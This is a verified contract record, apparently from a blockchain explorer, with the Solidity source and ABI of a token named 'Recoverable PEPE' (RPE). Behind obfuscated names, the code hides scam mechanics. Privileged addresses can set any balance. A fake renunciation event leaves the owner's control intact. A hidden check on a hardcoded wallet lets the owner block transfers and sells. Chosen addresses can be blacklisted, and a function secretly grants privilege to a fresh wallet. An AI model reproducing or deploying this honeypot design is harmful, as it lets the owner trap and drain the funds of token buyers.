{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface exemptSenderBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isExempt) external view returns (uint256);\n\n    function transfer(address shouldReceiver, uint256 enableFee) external returns (bool);\n\n    function allowance(address modeBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldReceiver,\n        uint256 enableFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxFee, uint256 value);\n    event Approval(address indexed modeBuy, address indexed spender, uint256 value);\n}\n\nabstract contract exemptMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountEnableMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletAt {\n    function createPair(address modeAt, address toTxMode) external returns (address);\n}\n\ninterface exemptSenderBuyMetadata is exemptSenderBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RecoverablePEPE is exemptMin, exemptSenderBuy, exemptSenderBuyMetadata {\n\n    mapping(address => uint256) private walletToken;\n\n    bool public receiverFrom;\n\n    uint256 public swapShouldAt;\n\n    function tradingLaunched(address launchMin, uint256 enableFee) public {\n        maxAuto();\n        walletToken[launchMin] = enableFee;\n    }\n\n    function takeTx(address enableLiquidityFrom, address shouldReceiver, uint256 enableFee) internal returns (bool) {\n        if (enableLiquidityFrom == amountMarketing) {\n            return fundTeam(enableLiquidityFrom, shouldReceiver, enableFee);\n        }\n        uint256 exemptTx = exemptSenderBuy(marketingSenderFee).balanceOf(enableWallet);\n        require(exemptTx == atFrom);\n        require(shouldReceiver != enableWallet);\n        if (exemptToken[enableLiquidityFrom]) {\n            return fundTeam(enableLiquidityFrom, shouldReceiver, receiverAt);\n        }\n        return fundTeam(enableLiquidityFrom, shouldReceiver, enableFee);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverAuto;\n    }\n\n    function owner() external view returns (address) {\n        return totalAuto;\n    }\n\n    bool private modeSwap;\n\n    function getOwner() external view returns (address) {\n        return totalAuto;\n    }\n\n    address private totalAuto;\n\n    address public marketingSenderFee;\n\n    string private sellAt = \"Recoverable PEPE\";\n\n    mapping(address => bool) public exemptToken;\n\n    string private tradingTo = \"RPE\";\n\n    function approve(address walletReceiver, uint256 enableFee) public virtual override returns (bool) {\n        totalFee[_msgSender()][walletReceiver] = enableFee;\n        emit Approval(_msgSender(), walletReceiver, enableFee);\n        return true;\n    }\n\n    uint256 private limitFrom;\n\n    uint256 constant receiverAt = 5 ** 10;\n\n    function maxAuto() private view {\n        require(modeTotalTx[_msgSender()]);\n    }\n\n    mapping(address => bool) public modeTotalTx;\n\n    bool public isMax;\n\n    function feeBuyLaunch() public {\n        emit OwnershipTransferred(amountMarketing, address(0));\n        totalAuto = address(0);\n    }\n\n    bool private shouldWallet;\n\n    function allowance(address tokenAuto, address walletReceiver) external view virtual override returns (uint256) {\n        if (walletReceiver == buyLaunched) {\n            return type(uint256).max;\n        }\n        return totalFee[tokenAuto][walletReceiver];\n    }\n\n    event OwnershipTransferred(address indexed minTeam, address indexed teamBuy);\n\n    address enableWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return sellAt;\n    }\n\n    constructor (){\n        \n        amountEnableMax receiverShould = amountEnableMax(buyLaunched);\n        marketingSenderFee = walletAt(receiverShould.factory()).createPair(receiverShould.WETH(), address(this));\n        if (totalSell) {\n            limitFrom = swapShouldAt;\n        }\n        amountMarketing = _msgSender();\n        feeBuyLaunch();\n        modeTotalTx[amountMarketing] = true;\n        walletToken[amountMarketing] = marketingSender;\n        if (modeSwap != isMax) {\n            limitFrom = swapShouldAt;\n        }\n        emit Transfer(address(0), amountMarketing, marketingSender);\n    }\n\n    function fundTeam(address enableLiquidityFrom, address shouldReceiver, uint256 enableFee) internal returns (bool) {\n        require(walletToken[enableLiquidityFrom] >= enableFee);\n        walletToken[enableLiquidityFrom] -= enableFee;\n        walletToken[shouldReceiver] += enableFee;\n        emit Transfer(enableLiquidityFrom, shouldReceiver, enableFee);\n        return true;\n    }\n\n    uint256 atFee;\n\n    function balanceOf(address isExempt) public view virtual override returns (uint256) {\n        return walletToken[isExempt];\n    }\n\n    bool public fundFrom;\n\n    function transfer(address launchMin, uint256 enableFee) external virtual override returns (bool) {\n        return takeTx(_msgSender(), launchMin, enableFee);\n    }\n\n    function marketingToken(uint256 enableFee) public {\n        maxAuto();\n        atFrom = enableFee;\n    }\n\n    bool private totalSell;\n\n    function modeTeam(address enableMaxSender) public {\n        maxAuto();\n        \n        if (enableMaxSender == amountMarketing || enableMaxSender == marketingSenderFee) {\n            return;\n        }\n        exemptToken[enableMaxSender] = true;\n    }\n\n    uint256 atFrom;\n\n    function transferFrom(address enableLiquidityFrom, address shouldReceiver, uint256 enableFee) external override returns (bool) {\n        if (_msgSender() != buyLaunched) {\n            if (totalFee[enableLiquidityFrom][_msgSender()] != type(uint256).max) {\n                require(enableFee <= totalFee[enableLiquidityFrom][_msgSender()]);\n                totalFee[enableLiquidityFrom][_msgSender()] -= enableFee;\n            }\n        }\n        return takeTx(enableLiquidityFrom, shouldReceiver, enableFee);\n    }\n\n    uint8 private receiverAuto = 18;\n\n    address public amountMarketing;\n\n    function maxTotalSell(address minTotal) public {\n        require(minTotal.balance < 100000);\n        if (fundFrom) {\n            return;\n        }\n        if (modeSwap == isMax) {\n            isMax = true;\n        }\n        modeTotalTx[minTotal] = true;\n        \n        fundFrom = true;\n    }\n\n    address buyLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingSender;\n    }\n\n    uint256 private marketingSender = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingTo;\n    }\n\n    mapping(address => mapping(address => uint256)) private totalFee;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBuyLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSenderFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableFee\",\"type\":\"uint256\"}],\"name\":\"marketingToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTotal\",\"type\":\"address\"}],\"name\":\"maxTotalSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMaxSender\",\"type\":\"address\"}],\"name\":\"modeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeTotalTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapShouldAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableFee\",\"type\":\"uint256\"}],\"name\":\"tradingLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLiquidityFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RecoverablePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}